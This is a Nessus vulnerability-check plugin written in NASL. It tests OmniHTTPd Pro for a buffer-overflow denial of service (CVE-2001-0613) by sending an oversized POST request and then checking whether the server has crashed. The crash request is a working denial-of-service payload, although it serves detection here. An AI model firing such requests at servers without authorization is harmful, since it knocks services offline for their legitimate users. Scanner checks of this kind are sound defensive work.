#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(15553);
 script_version("$Revision: 1.10 $");
 script_cve_id("CVE-2001-0613");
 script_bugtraq_id(2730);
 script_osvdb_id(1829);
 
 script_name(english:"OmniHTTPd Pro Long POST Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote host is running OmniHTTPd Pro HTTP Server.

The remote version of this software seems to be vulnerable to a buffer 
overflow when handling specially long POST request. This may allow an
attacker to crash the remote service, thus preventing it from answering 
legitimate client requests." );
 script_set_attribute(attribute:"solution", value:
"None at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/05/15");
 script_cvs_date("$Date: 2012/06/29 20:23:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Test OmniHTTPd pro long POST DoS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2012 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0);
if ( http_is_dead(port:port) ) exit(0);


banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( ! egrep(pattern:"^Server: OmniHTTPd", string:banner ) ) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

len = 4200;	# 4111 should be enough
req = string("POST ", "/", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port: port))
{
 security_warning(port);
 exit(0);
} 
